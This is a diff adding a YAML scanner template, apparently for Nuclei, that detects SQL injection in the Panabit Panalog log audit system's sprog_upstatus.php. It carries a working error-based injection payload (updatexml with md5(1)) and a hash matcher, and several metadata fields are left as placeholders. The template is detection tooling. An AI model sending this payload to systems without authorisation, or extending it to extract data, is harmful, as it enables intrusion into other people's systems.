@@ -1,0 +1,19 @@
+id: Panabit-Panalog-upstatus-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: panabit日志审计系统sprog_upstatus存在SQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,md5(1)),0)&rdb=1"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849
